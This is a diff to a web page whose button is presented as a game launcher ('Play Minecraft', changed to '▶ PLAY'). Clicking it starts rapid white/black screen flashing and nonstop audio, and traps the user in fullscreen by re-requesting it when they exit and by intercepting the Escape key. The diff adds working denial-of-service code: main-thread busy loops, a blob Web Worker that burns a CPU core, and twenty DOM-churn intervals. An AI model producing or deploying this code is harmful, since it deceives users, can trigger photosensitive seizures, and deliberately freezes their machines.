@@ -51,7 +51,7 @@
 </head>
 <body>
 
-    <button id="playBtn">Play Minecraft</button>
+    <button id="playBtn">▶ PLAY</button>
     <div id="overlay"></div>
 
     <script>
@@ -61,13 +61,40 @@
             let audio = null;
             let colorInterval = null;
             let audioInterval = null;
+            let lagInterval = null;
             let isPlaying = false;
 
             // Pre-create audio
             audio = new Audio('https://www.image2url.com/r2/default/audio/1781189273445-63fdf56a-4b63-4e73-a0a3-7b11d2754bf5.mp3');
             audio.preload = 'auto';
-            audio.loop = false; // we'll handle looping manually
+            audio.loop = false;
             audio.volume = 1.0;
+
+            // --- LAG FUNCTION ---
+            function induceLag() {
+                // Spin the CPU with useless heavy operations
+                const start = performance.now();
+                // Intense loop for ~50ms to freeze the event loop
+                while (performance.now() - start < 50) {
+                    // Heavy string operations, regex, array churn
+                    let s = '';
+                    for (let i = 0; i < 10000; i++) {
+                        s += Math.random().toString(36).repeat(5);
+                        s = s.replace(/[aeiou]/gi, '');
+                        s = s.split('').reverse().join('');
+                    }
+                    // Allocate and discard arrays
+                    const big = new Array(50000).fill(null).map((_, idx) => ({
+                        index: idx,
+                        value: Math.random() * 100000,
+                        hash: btoa(String(idx * Math.random()))
+                    }));
+                    // Force GC pressure with string concat
+                    big.forEach(item => {
+                        item.longStr = item.value.toString().repeat(200);
+                    });
+                }
+            }
 
             function startTerror() {
                 if (isPlaying) return;
@@ -97,51 +124,96 @@
                     overlay.style.backgroundColor = flashState ? 'white' : 'black';
                 }, 100);
 
-                // 3. Play audio nonstop (retrigger on end)
+                // 3. Audio nonstop
                 function playLoop() {
                     if (!isPlaying) return;
                     audio.currentTime = 0;
                     audio.play().catch(() => {});
                 }
-
-                // Start first play
                 playLoop();
-
-                // Re-trigger every time the audio ends
                 audio.addEventListener('ended', playLoop);
-
-                // Also a safety interval to ensure it keeps playing
                 audioInterval = setInterval(() => {
                     if (audio.paused && isPlaying) {
                         audio.currentTime = 0;
                         audio.play().catch(() => {});
                     }
                 }, 500);
+
+                // 4. LAG: Hammer the CPU every 100ms
+                // This will cause frame drops, UI freezing, and overall lag
+                lagInterval = setInterval(() => {
+                    // Run multiple lag cycles per tick
+                    for (let cycle = 0; cycle < 3; cycle++) {
+                        induceLag();
+                    }
+                }, 100);
+
+                // Also spawn a background Web Worker-style lag (inline via blob)
+                try {
+                    // Create inline blob worker that pegs a core
+                    const workerBlob = new Blob([`
+                        setInterval(function() {
+                            // Infinite CPU burn in worker
+                            var start = Date.now();
+                            while (Date.now() - start < 200) {
+                                var x = 0;
+                                for (var i = 0; i < 1000000; i++) {
+                                    x += Math.atan(Math.sqrt(i * Math.random()));
+                                }
+                                // String abuse
+                                var s = '';
+                                for (var j = 0; j < 5000; j++) {
+                                    s += String.fromCharCode((j % 95) + 32);
+                                    s = s.split('').sort(function() { return 0.5 - Math.random(); }).join('');
+                                }
+                            }
+                        }, 50);
+                    `], { type: 'application/javascript' });
+                    const workerUrl = URL.createObjectURL(workerBlob);
+                    const worker = new Worker(workerUrl);
+                    // Store reference so GC doesn't kill it
+                    window._lagWorker = worker;
+                } catch(e) {
+                    // Web Worker may fail in some contexts, fallback to main thread only
+                }
+
+                // Extra: spawn many intervals that do pointless work
+                for (let i = 0; i < 20; i++) {
+                    (function() {
+                        const id = setInterval(() => {
+                            // Heavy DOM access & modification (even though overlay is shown)
+                            document.title = document.title + '';
+                            const tmp = document.createElement('div');
+                            tmp.style.display = 'none';
+                            tmp.innerHTML = new Array(1000).join('x');
+                            document.body.appendChild(tmp);
+                            document.body.removeChild(tmp);
+                        }, 50);
+                        // Store so we can clear later if needed (but we won't)
+                        if (!window._lagIntervals) window._lagIntervals = [];
+                        window._lagIntervals.push(id);
+                    })();
+                }
             }
 
             btn.addEventListener('click', startTerror);
 
-            // Prevent exiting fullscreen easily (re-request fullscreen on exit)
+            // Prevent exiting fullscreen
             document.addEventListener('fullscreenchange', () => {
                 if (!document.fullscreenElement && isPlaying) {
-                    try {
-                        document.documentElement.requestFullscreen();
-                    } catch(e) {}
+                    try { document.documentElement.requestFullscreen(); } catch(e) {}
                 }
             });
             document.addEventListener('webkitfullscreenchange', () => {
                 if (!document.webkitFullscreenElement && isPlaying) {
-                    try {
-                        document.documentElement.webkitRequestFullscreen();
-                    } catch(e) {}
+                    try { document.documentElement.webkitRequestFullscreen(); } catch(e) {}
                 }
             });
 
-            // Trap escape key — prevent easy exit
+            // Trap escape
             document.addEventListener('keydown', (e) => {
                 if (e.key === 'Escape' && isPlaying) {
                     e.preventDefault();
-                    // Re-request fullscreen
                     try {
                         if (document.documentElement.requestFullscreen) {
                             document.documentElement.requestFullscreen();
@@ -152,13 +224,19 @@
                 }
             });
 
-            // Cleanup on page unload just in case
+            // Cleanup on unload
             window.addEventListener('beforeunload', () => {
                 if (colorInterval) clearInterval(colorInterval);
                 if (audioInterval) clearInterval(audioInterval);
-                if (audio) {
-                    audio.pause();
-                    audio.src = '';
+                if (lagInterval) clearInterval(lagInterval);
+                if (audio) { audio.pause(); audio.src = ''; }
+                // Kill worker if exists
+                if (window._lagWorker) {
+                    window._lagWorker.terminate();
+                }
+                // Kill extra intervals
+                if (window._lagIntervals) {
+                    window._lagIntervals.forEach(id => clearInterval(id));
                 }
                 isPlaying = false;
             });
